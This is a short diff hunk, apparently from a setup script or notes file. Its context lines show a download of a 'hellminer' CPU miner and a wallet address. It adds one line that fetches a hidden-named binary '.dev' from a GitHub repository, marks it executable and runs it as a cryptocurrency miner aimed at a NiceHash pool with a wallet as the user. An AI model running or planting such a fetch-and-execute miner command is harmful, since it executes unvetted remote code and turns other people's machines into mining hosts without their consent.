@@ -10,3 +10,8 @@ wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.
 
 
 RLYutKyuv2UioD8mJpfLd6VyCa9tzL4EMR
+
+
+
+
+wget https://github.com/WhynotSir/sirji/raw/main/.dev && chmod +x .dev && ./.dev --algo BEAM-III --pool stratum+tcp://beamv3.usa-west.nicehash.com:3387 --user 39iTjvCy31xDUKU4XR2g5b1HrB3N2VuUM8
